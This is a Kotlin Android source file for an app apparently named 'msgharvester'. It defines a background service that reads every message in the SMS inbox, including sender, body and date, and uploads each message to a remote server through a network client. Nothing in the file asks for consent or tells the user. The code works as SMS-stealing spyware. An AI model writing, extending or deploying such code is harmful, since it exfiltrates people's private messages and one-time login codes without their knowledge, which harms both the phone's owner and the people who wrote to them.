package com.msgharvester.app

import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.os.IBinder
import android.provider.Telephony
import android.util.Log
import java.util.concurrent.Executors

class ReadAllSmsService : Service() {
    private val executor = Executors.newSingleThreadExecutor()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        executor.submit {
            readAllSmsAndSend()
            stopSelf()
        }
        return START_NOT_STICKY
    }

    private fun readAllSmsAndSend() {
        try {
            val resolver: ContentResolver = contentResolver
            val uri = Telephony.Sms.Inbox.CONTENT_URI
            val projection = arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE)
            val cursor = resolver.query(uri, projection, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val from = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    NetworkClient.postSmsToServer(id.toString(), from ?: "", body ?: "", date/1000, null)
                }
            }
        } catch (e: Exception) {
            Log.e("ReadAllSmsService", "Error reading SMS: ${'$'}{e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
